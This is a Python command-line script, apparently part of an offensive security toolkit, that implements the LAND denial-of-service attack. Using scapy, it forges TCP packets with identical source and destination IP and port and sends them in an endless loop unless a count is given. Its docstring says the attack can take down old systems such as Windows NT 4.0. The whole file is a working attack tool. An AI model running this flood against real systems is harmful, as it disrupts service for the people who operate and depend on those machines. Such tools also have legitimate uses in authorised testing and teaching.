#!/usr/bin/env python3

import sys
from time import sleep
import logging
import click

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import IP, TCP, conf, send


@click.command()
@click.argument('ip')
@click.option('-c', 'count', default=0, help='How many packets send (default: infinit)')
@click.option('-p', 'port', default=135, help='Port to use (default: 135)')
@click.option('-i', 'iface', default=None, help='Interface to use')
@click.option('-v', 'verbose', is_flag=True, default=False, help='Verbose')
def cmd_land(ip, count, port, iface, verbose):
    """This command implements the LAND attack, that sends packets forging the
    source IP address to be the same that the destination IP. Also uses the
    same source and destination port.

    The attack is very old, and can be used to make a Denial of Service on
    old systems, like Windows NT 4.0. More information here:
    https://en.wikipedia.org/wiki/LAND

    \b
    # sudo habu.land 172.16.0.10
    ............

    Note: Each dot (.) is a sent packet. You can specify how many
    packets send with the '-c' option. The default is never stop. Also, you
    can specify the destination port, with the '-p' option.
    """

    conf.verb = False

    if iface:
        conf.iface = iface

    layer3 = IP()
    layer3.dst = ip
    layer3.src = ip

    layer4 = TCP()
    layer4.dport = port
    layer4.sport = port

    pkt = layer3 / layer4

    counter = 0

    while True:
        send(pkt)
        counter += 1

        if verbose:
            print(pkt.summary())
        else:
            print('.', end='')
            sys.stdout.flush()

        if count != 0 and counter == count:
            break

    return True

if __name__ == '__main__':
    cmd_land()
